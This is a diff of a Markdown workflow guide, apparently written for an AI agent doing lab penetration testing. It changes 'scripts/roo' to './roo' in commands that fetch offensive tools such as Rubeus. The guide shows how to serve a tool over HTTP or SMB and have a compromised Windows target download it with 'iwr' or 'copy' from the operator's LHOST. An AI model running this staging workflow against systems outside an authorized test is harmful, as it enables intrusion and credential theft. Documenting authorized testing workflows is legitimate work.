@@ -33,13 +33,13 @@ internet, never the VPN** (Forge is a public registry, like CVE lookups).
 ## Commands
 
 ```bash
-scripts/roo tools list [filter]     # what Forge offers (★ marks the default build)
-scripts/roo tools builds <name>     # every build of one tool (main vs release, commits, dates)
-scripts/roo tools get <name>        # download + unpack the DEFAULT build → /tools/<name>/
-scripts/roo tools get <name> --release      # force the newest tagged release instead
-scripts/roo tools get <name> --ref <commit|version>   # pin an exact build
-scripts/roo tools installed         # what's in the volume now
-scripts/roo tools rm <name>         # remove /tools/<name> from the volume
+./roo tools list [filter]     # what Forge offers (★ marks the default build)
+./roo tools builds <name>     # every build of one tool (main vs release, commits, dates)
+./roo tools get <name>        # download + unpack the DEFAULT build → /tools/<name>/
+./roo tools get <name> --release      # force the newest tagged release instead
+./roo tools get <name> --ref <commit|version>   # pin an exact build
+./roo tools installed         # what's in the volume now
+./roo tools rm <name>         # remove /tools/<name> from the volume
 ```
 
 `list`/`builds`/`get` don't need the VPN. Names map to upstream repos — `rubeus`,
@@ -76,27 +76,27 @@ already the default.
 
 ## Workflow
 
-1. **Find it.** `scripts/roo tools list rubeus` (★ = what `get` pulls). Unsure
-   which build? `scripts/roo tools builds rubeus` shows main vs release + dates.
-2. **Fetch it.** `scripts/roo tools get rubeus` → pulls the **main** build to
+1. **Find it.** `./roo tools list rubeus` (★ = what `get` pulls). Unsure
+   which build? `./roo tools builds rubeus` shows main vs release + dates.
+2. **Fetch it.** `./roo tools get rubeus` → pulls the **main** build to
    `/tools/rubeus/` (a bundle may contain several .NET-version builds; pick the one
    the target's runtime supports). Idempotent — re-`get` to refresh. Need the
    pinned release instead? `--release`; an exact commit? `--ref <commit>`.
 3. **Use it from a `roo shell`.** The volume is mounted at `/tools`, so the binary
    is right there:
    ```bash
-   scripts/roo shell ls /tools/rubeus            # (PowerShell host: prefix MSYS_NO_PATHCONV=1
-   scripts/roo shell sh -c 'ls -la /tools'       #  is only needed from Git-Bash, see CLAUDE.md)
+   ./roo shell ls /tools/rubeus            # (PowerShell host: prefix MSYS_NO_PATHCONV=1
+   ./roo shell sh -c 'ls -la /tools'       #  is only needed from Git-Bash, see CLAUDE.md)
    ```
 4. **Stage it onto the target.** The `.exe` runs on *Windows*, not in the Linux
    container — the container just **serves** it at the tunnel IP. From a `roo
    shell` (LHOST = `roo ip`):
    ```bash
    # HTTP pickup:
-   scripts/roo shell sh -c 'cd /tools/rubeus && python3 -m http.server 8000'
+   ./roo shell sh -c 'cd /tools/rubeus && python3 -m http.server 8000'
    #   on target:  iwr http://<LHOST>:8000/Rubeus.exe -OutFile C:\Windows\Temp\r.exe
    # or SMB:
-   scripts/roo shell impacket-smbserver -smb2support share /tools
+   ./roo shell impacket-smbserver -smb2support share /tools
    #   on target:  copy \\<LHOST>\share\rubeus\Rubeus.exe .
    ```
    Then execute on the target through your foothold (the ad skill's shells / exec
